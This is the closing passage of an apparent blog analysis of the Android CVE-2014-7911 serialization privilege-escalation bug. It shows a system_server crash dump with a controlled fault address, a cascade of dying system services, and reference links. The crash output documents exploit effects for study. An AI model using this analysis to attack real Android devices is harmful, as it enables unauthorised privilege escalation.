I/DEBUG   (  130):     d20 1f1f1f1f1f1f1f1f  d21 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d22 1f1f1f1f1f1f1f1f  d23 9999999999999999
I/DEBUG   (  130):     d24 1f1f1f1f1f1f1f1f  d25 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d26 1f1f1f1f1f1f1f1f  d27 9999999999999999
I/DEBUG   (  130):     d28 0100010001000100  d29 0100010001000100
I/DEBUG   (  130):     d30 9999999999999999  d31 9999999999999999
I/DEBUG   (  130):     scr 20000010
I/DEBUG   (  130): 
I/DEBUG   (  130): backtrace:
I/DEBUG   (  130):     #00  pc 0000ee44  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)
I/DEBUG   (  130):     #01  pc 00065cef  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #02  pc 0001df30  /system/lib/libdvm.so (dvmPlatformInvoke+112)
I/DEBUG   (  130):     #03  pc 0004d183  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+394)
I/DEBUG   (  130):     #04  pc 00027360  /system/lib/libdvm.so
I/DEBUG   (  130):     #05  pc 0002bc68  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+180)
I/DEBUG   (  130):     #06  pc 0005f8f5  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+272)
I/DEBUG   (  130):     #07  pc 0005f91f  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)
I/DEBUG   (  130):     #08  pc 000544d3  /system/lib/libdvm.so
I/DEBUG   (  130):     #09  pc 00012e00  /system/lib/libc.so (__thread_entry+48)
I/DEBUG   (  130):     #10  pc 00012558  /system/lib/libc.so (pthread_create+172)
I/DEBUG   (  130): 
I/DEBUG   (  130): stack:
I/DEBUG   (  130):          5cf2ac10  f2000001  
I/DEBUG   (  130):          5cf2ac14  f2000001  
I/DEBUG   (  130):          5cf2ac18  5cf2ac44  
I/DEBUG   (  130):          5cf2ac1c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac20  40cca768  
I/DEBUG   (  130):          5cf2ac24  f2100001  
I/DEBUG   (  130):          5cf2ac28  5cf2ac44  
I/DEBUG   (  130):          5cf2ac2c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac30  40cca768  
I/DEBUG   (  130):          5cf2ac34  4077efa9  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac38  f2100001  
I/DEBUG   (  130):          5cf2ac3c  407811dd  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac40  40cca768  
I/DEBUG   (  130):          5cf2ac44  50e2a908  
I/DEBUG   (  130):          5cf2ac48  df0027ad  
I/DEBUG   (  130):          5cf2ac4c  00000000  
I/DEBUG   (  130):     #00  5cf2ac50  402248ec  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):          5cf2ac54  40cca768  
I/DEBUG   (  130):          5cf2ac58  f2100001  
I/DEBUG   (  130):          5cf2ac5c  401d5cf3  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #01  5cf2ac60  5831a278  /data/dalvik-cache/system@framework@core.jar@classes.dex
I/DEBUG   (  130):          5cf2ac64  5713b048  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac68  50e2a908  
I/DEBUG   (  130):          5cf2ac6c  00000000  
I/DEBUG   (  130):          5cf2ac70  57090f70  
I/DEBUG   (  130):          5cf2ac74  5cf2ac80  
I/DEBUG   (  130):          5cf2ac78  57090f68  
I/DEBUG   (  130):          5cf2ac7c  40753f34  /system/lib/libdvm.so (dvmPlatformInvoke+116)
I/DEBUG   (  130):     #02  5cf2ac80  57090f64  
I/DEBUG   (  130):          5cf2ac84  00000001  
I/DEBUG   (  130):          5cf2ac88  42a4e838  /dev/ashmem/dalvik-heap (deleted)
I/DEBUG   (  130):          5cf2ac8c  00000000  
I/DEBUG   (  130):          5cf2ac90  00000000  
I/DEBUG   (  130):          5cf2ac94  40783187  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r0:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r1:
I/DEBUG   (  130):     401d60d8 604060e0 0010f104 608968e1 f7d32100  .`@`.....h.`.!..
I/DEBUG   (  130):     401d60e8 4620eba0 bf00bd10 0004b6c4 0004c702  .. F............
I/DEBUG   (  130):     401d60f8 43f0e92d 68084604 460eb085 28004605  -..C.F.h...F.F.(
I/DEBUG   (  130):     401d6108 80a5f000 49546802 44796a13 b1104798  .....hTI.jyD.G..
I/DEBUG   (  130):     401d6118 69056830 4851e09b 44784f51 ece2f7d3  0h.i..QHQOxD....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r2:
I/DEBUG   (  130):     50e2a8e8 00000000 0000001b 00680043 00690072  ........C.h.r.i.
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..'Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r3:
I/DEBUG   (  130):     5713afc4 00000004 40dfdab8 0000003c 40dfdff8  .......@&lt;......@
I/DEBUG   (  130):     5713afd4 58ee622a 58df4f87 00000012 00000008  *b.X.O.X........
I/DEBUG   (  130):     5713afe4 40dfdff8 58ee0b14 58da66bf 00000002  ...@...X.f.X....
I/DEBUG   (  130):     5713aff4 0000000c 40dfdff8 58edfe02 58da66bf  .......@...X.f.X
I/DEBUG   (  130):     5713b004 00000002 00000010 000000ac 40dfdff8  ...............@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r4:
I/DEBUG   (  130):     402248cc 5713ad88 1d2000de 5713a4b8 5713a3f8  ...W.. ....W...W
I/DEBUG   (  130):     402248dc 00000001 570e46b0 00000107 1d2000ea  .....F.W...... .
I/DEBUG   (  130):     402248ec 1d2000ee 5713b010 5713b080 5713aff8  .. ....W...W...W
I/DEBUG   (  130):     402248fc 5713afd0 5713afe4 1d2000f6 5713b448  ...W...W.. .H..W
I/DEBUG   (  130):     4022490c 00000000 5712e128 1d2000b2 1d2000b6  ....(..W.. ... .
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r5:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r7:
I/DEBUG   (  130):     40781184 693b0f40 18c2d005 46204629 e824f7dd  @.;i....)F F..$.
I/DEBUG   (  130):     40781194 18c0e002 4500e9c0 f7fda801 bdfefefd  .......E........
I/DEBUG   (  130):     407811a4 4606b5f7 a801460c 46154631 f7fd461f  ...F.F..1F.F.F..
I/DEBUG   (  130):     407811b4 9801fecf f7fe4621 68ebfec7 0f40f013  ....!F.....h..@.
I/DEBUG   (  130):     407811c4 bf08692b d00450c7 8f5ef3bf f3bf50c7  +i...P....^..P..
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r8:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r9:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sl:
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..'Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130):     50e2a938 00000000 00000000 56545670 5708d300  ........pVTV...W
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near fp:
I/DEBUG   (  130):     5cf2ac74 5cf2ac80 57090f68 40753f34 57090f64  ...\h..W4?u@d..W
I/DEBUG   (  130):     5cf2ac84 00000001 42a4e838 00000000 00000000  ....8..B........
I/DEBUG   (  130):     5cf2ac94 40783187 57090f64 58e4e177 401d5ca9  .1x@d..Ww..X.\.@
I/DEBUG   (  130):     5cf2aca4 50e2a918 00000000 00000000 5b8fafc8  ...P...........[
I/DEBUG   (  130):     5cf2acb4 4014fa70 00000001 50e2a908 ffffbfff  p..@.......P....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near ip:
I/DEBUG   (  130):     40222d5c 40450a35 40450a91 40155370 402deca0  5.E@..E@pS.@..-@
I/DEBUG   (  130):     40222d6c 404509d1 404508a5 400ac8d9 4042bdf5  ..E@..E@...@..B@
I/DEBUG   (  130):     40222d7c 400d8e41 40450869 40450795 404507f9  A..@i.E@..E@..E@
I/DEBUG   (  130):     40222d8c 4045175d 40451a4d 40450715 4011625c  ].E@M.E@..E@\b.@
I/DEBUG   (  130):     40222d9c 40139135 400d8d8f 4024578d 4024d549  5..@...@.W$@I.$@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sp:
I/DEBUG   (  130):     5cf2ac30 40cca768 4077efa9 f2100001 407811dd  h..@..w@......x@
I/DEBUG   (  130):     5cf2ac40 40cca768 50e2a908 df0027ad 00000000  h..@...P.'......
I/DEBUG   (  130):     5cf2ac50 402248ec 40cca768 f2100001 401d5cf3  .H&quot;@h..@.....\.@
I/DEBUG   (  130):     5cf2ac60 5831a278 5713b048 50e2a908 00000000  x.1XH..W...P....
I/DEBUG   (  130):     5cf2ac70 57090f70 5cf2ac80 57090f68 40753f34  p..W...\h..W4?u@
I/DEBUG   (  130): 
I/DEBUG   (  130): code around pc:
I/DEBUG   (  130):     400d8e24 680168a0 4629694a 68e34790 d50407da  .h.hJi)F.G.h....
I/DEBUG   (  130):     400d8e34 b11068a0 68536802 bd384798 4605b570  .h...hSh.G8.p..F
I/DEBUG   (  130):     400d8e44 460e6844 f7fd4620 2801eb3e 68a0d10b  Dh.F F..&gt;..(...h
I/DEBUG   (  130):     400d8e54 68ca6801 47904631 07d868e3 6828d403  .h.h1F.G.h....(h
I/DEBUG   (  130):     400d8e64 46286843 46204798 e8bd4631 f7ff4070  Ch(F.G F1F..p@..
I/DEBUG   (  130): 
I/DEBUG   (  130): code around lr:
I/DEBUG   (  130):     401d5cd0 468168e2 47b84628 69626829 46282300  .h.F(F.G)hbi.#(F
I/DEBUG   (  130):     401d5ce0 71b4f8d1 47b84631 4648490a f7d34479  ...q1F.G.IHFyD..
I/DEBUG   (  130):     401d5cf0 f8d8ee92 46313000 0c0cf853 f7d34440  .....01FS...@D..
I/DEBUG   (  130):     401d5d00 f7d5ee8a e8bdea10 f02443f8 bf00bed7  .........C$.....
I/DEBUG   (  130):     401d5d10 0004ec36 00000409 4605b538 447b4b0f  6.......8..F.K{D
I/DEBUG   (  130): 
I/DEBUG   (  130): memory map around fault addr 1337bef3:
I/DEBUG   (  130):     (no map below)
I/DEBUG   (  130):     (no map for address)
I/DEBUG   (  130):     40000000-40002000 /system/lib/libsystem_server.so
E/dalvikvm(  553): GC_FOR_ALLOC freed 1895K, 17% free 20590K/24711K, paused 3ms+4ms, total 33ms
E/dalvikvm(  343): GC_CONCURRENT freed 1909K, 72% free 960K/3395K, paused 11ms+19ms, total 41ms
I/ServiceManager(  125): service 'network_management' died
W/AudioFlinger(32595): power manager service died !!!
I/ServiceManager(  125): service 'backup' died
I/ServiceManager(  125): service 'permission' died
I/ServiceManager(  125): service 'hardware' died
I/ServiceManager(  125): service 'netstats' died
I/ServiceManager(  125): service 'sensorservice' died
I/ServiceManager(  125): service 'content' died
I/ServiceManager(  125): service 'mount' died
I/ServiceManager(  125): service 'account' died
I/ServiceManager(  125): service 'alarm' died
I/ServiceManager(  125): service 'scheduling_policy' died
I/ServiceManager(  125): service 'cpuinfo' died
I/ServiceManager(  125): service 'power' died
I/ServiceManager(  125): service 'clipboard' died
I/ServiceManager(  125): service 'textservices' died
I/ServiceManager(  125): service 'commontime_management' died
I/ServiceManager(  125): service 'input_method' died
I/ServiceManager(  125): service 'device_policy' died
I/ServiceManager(  125): service 'accessibility' died
I/ServiceManager(  125): service 'statusbar' died
I/ServiceManager(  125): service 'window' died
I/ServiceManager(  125): service 'input' died
I/ServiceManager(  125): service 'battery' died
I/ServiceManager(  125): service 'RfTestService' died
I/ServiceManager(  125): service 'bluetooth_gattclient' died
I/ServiceManager(  125): service 'vibrator' died
I/ServiceManager(  125): service 'batteryinfo' died
I/ServiceManager(  125): service 'bluetooth_a2dp' died
I/ServiceManager(  125): service 'bluetooth' died
I/ServiceManager(  125): service 'bluetooth_gattserver' died
I/ServiceManager(  125): service 'lock_settings' died
I/ServiceManager(  125): service 'usagestats' died
I/ServiceManager(  125): service 'netpolicy' died
I/ServiceManager(  125): service 'wifip2p' died
I/ServiceManager(  125): service 'wifi' died
I/ServiceManager(  125): service 'connectivity' died
W/Sensors (  553): sensorservice died [0x5b6ab978]
I/ServiceManager(  125): service 'servicediscovery' died
I/ServiceManager(  125): service 'throttle' died
I/ServiceManager(  125): service 'updatelock' died
I/ServiceManager(  125): service 'entropy' died
I/ServiceManager(  125): service 'notification' died
I/ServiceManager(  125): service 'hdmi' died
I/ServiceManager(  125): service 'devicestoragemonitor' died
I/ServiceManager(  125): service 'location' died
I/ServiceManager(  125): service 'country_detector' died
I/ServiceManager(  125): service 'search' died
I/ServiceManager(  125): service 'dropbox' died
I/ServiceManager(  125): service 'wallpaper' died
I/ServiceManager(  125): service 'diskstats' died
I/ServiceManager(  125): service 'audio' died
I/ServiceManager(  125): service 'samplingprofiler' died
I/ServiceManager(  125): service 'usb' died
I/ServiceManager(  125): service 'serial' died
I/ServiceManager(  125): service 'appwidget' died
I/ServiceManager(  125): service 'uimode' died
I/ServiceManager(  125): service 'ku.pService.dr' died
I/ServiceManager(  125): service 'package' died
I/ServiceManager(  125): service 'activity' died
I/ServiceManager(  125): service 'meminfo' died
I/ServiceManager(  125): service 'gfxinfo' died
I/ServiceManager(  125): service 'dbinfo' died
I/ServiceManager(  125): service 'telephony.registry' died
D/AndroidRuntime( 2684): Shutting down VM
</code></pre>

<h2 id="references">References</h2>

<ul>
<li><a href="http://seclists.org/fulldisclosure/2014/Nov/51">http://seclists.org/fulldisclosure/2014/Nov/51</a></li>
<li><a href="http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
<li><a href="http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></li>
<li><a href="http://drops.wooyun.org/mobile/6082">http://drops.wooyun.org/mobile/6082</a></li>
</ul>

</div>


  <footer class="container">
  <div class="container navigation no-print">
  <h2>Navigation</h2>
  
  

    

    
    <a class="next" href="https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/" title="Analysis of cve-2015-6420">
      Next
    </a>
    

  


</div>

  <div class="container comments">
  <h2>Comments</h2>
  

</div>

</footer>

</article>
      <footer id="main-footer" class="container main_footer">
  

  <div class="container nav foot no-print">
  

  <a class="toplink" href="#">back to top</a>

</div>

  <div class="container credits">
  
<div class="container footline">
  

</div>


  
<div class="container copyright">
  
  &copy; 2016 zeqi


</div>


</div>

</footer>

    </main>
    


<script src="https://zeqiii.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




    
  </body>
</html>

